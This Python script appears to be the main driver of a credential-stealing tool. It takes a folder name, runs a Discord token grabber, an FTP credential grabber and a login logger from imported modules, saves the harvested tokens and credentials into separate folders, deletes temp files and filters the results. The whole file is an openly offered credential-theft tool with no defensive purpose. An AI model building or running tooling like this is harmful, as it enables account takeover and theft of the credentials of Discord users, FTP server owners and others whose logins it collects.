import os
import time
from resources.rename import rename_folders
from resources.DiscordTokens import token_grabber
from resources.logins import *
from resources.filter import *
from resources.ftp import *

def runner(base_folder):
    if not os.path.exists(base_folder):
        print(f"Error : '{base_folder}' does not exist")
        return
    else:
        rename_folders(os.path.join(base_folder))
        print("----Starting Discord Token Grabber.---- ")
        time.sleep(5)
        if not os.path.exists("Discord"):
            os.makedirs("Discord")
        token_grabber(base_folder ,os.path.join("Discord","DiscordTokens.txt"))
        print("----Starting FTP Cred. Grabber.----")
        time.sleep(5)
        if not os.path.exists("FTP"):
            os.makedirs("FTP")
        runftp(base_folder, os.path.join("FTP","FTP_Cred.txt"))
        print("----Starting logger.----")
        time.sleep(5)
        if not os.path.exists("logins"):
            os.makedirs("logins")
        runlogins(base_folder)
        print("----Successfully logged .. Clearing temp files.----")
        time.sleep(5)
        os.remove("temp.txt")
        os.remove("ftp_temp.txt")
        print("----Starting Filtering.----")
        time.sleep(5)
        filter_files("Discord")
        filter_files("logins")
        filter_files("FTP")
        print("-----------------------ALL DONE.-----------------------")

if __name__ == "__main__":
    base_folder = input("Enter base folder name ")
    runner(base_folder)
    
